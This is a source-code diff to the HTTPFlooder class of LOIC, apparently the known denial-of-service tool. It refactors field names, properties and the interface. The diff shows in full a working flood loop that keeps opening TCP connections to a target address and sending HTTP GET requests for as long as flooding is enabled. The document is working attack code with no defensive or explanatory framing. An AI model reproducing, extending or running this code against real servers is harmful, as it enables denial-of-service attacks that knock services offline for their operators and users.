@@ -6,11 +6,11 @@ using System.Windows.Forms;
 
 namespace LOIC
 {
-	public class HTTPFlooder
+	class HTTPFlooder : IFlooder
 	{
 		#region Fields
-		private long LastAction;
-		private Random rnd = new Random();
+		private long lastAction;
+		private Random random = new Random();
 		private Timer tTimepoll = new Timer();
 		#endregion
 
@@ -27,7 +27,7 @@ namespace LOIC
 		#endregion
 
 		#region Properties
-		public ReqState State = ReqState.Ready;
+		public int Delay { get; set; }
 
 		public int Downloaded { get; set; }
 
@@ -41,19 +41,20 @@ namespace LOIC
 
 		public int Port { get; set; }
 
+		public bool Resp { get; set; }
+
+		public ReqState State { get; set; }
+
 		public string Subsite { get; set; }
 
-		public int Delay { get; set; }
-
 		public int Timeout { get; set; }
-
-		public bool Resp { get; set; }
 		#endregion
 
 		#region Methods
 		public void Start()
 		{
-			IsFlooding = true; LastAction = Tick();
+			this.IsFlooding = true;
+			lastAction = Tick();
 
 			tTimepoll = new Timer();
 			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
@@ -77,20 +78,20 @@ namespace LOIC
 			{
 				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.0{1}{1}{1}", Subsite, Environment.NewLine));
 				var host = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
-				while (IsFlooding)
+				while (this.IsFlooding)
 				{
-					State = ReqState.Ready; // SET STATE TO READY //
-					LastAction = Tick();
+					this.State = ReqState.Ready; // SET this.State TO READY //
+					lastAction = Tick();
 					byte[] recvBuf = new byte[64];
 					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-					State = ReqState.Connecting; // SET STATE TO CONNECTING //
+					this.State = ReqState.Connecting; // SET this.State TO CONNECTING //
 					socket.Connect(host);
 					socket.Blocking = Resp;
-					State = ReqState.Requesting; // SET STATE TO REQUESTING //
+					this.State = ReqState.Requesting; // SET this.State TO REQUESTING //
 					socket.Send(buf, SocketFlags.None);
-					State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++
+					this.State = ReqState.Downloading; Requested++; // SET this.State TO DOWNLOADING // REQUESTED++
 					if (Resp) socket.Receive(recvBuf, 64, SocketFlags.None);
-					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
+					this.State = ReqState.Completed; Downloaded++; // SET this.State TO COMPLETED // DOWNLOADED++
 					tTimepoll.Stop();
 					if (Delay > 0) System.Threading.Thread.Sleep(Delay);
 				}
@@ -101,7 +102,7 @@ namespace LOIC
 
 		private void tTimepoll_Tick(object sender, EventArgs e)
 		{
-			if (Tick() > LastAction + Timeout)
+			if (Tick() > lastAction + Timeout)
 			{
 				this.IsFlooding = false;
 				this.Failed++;
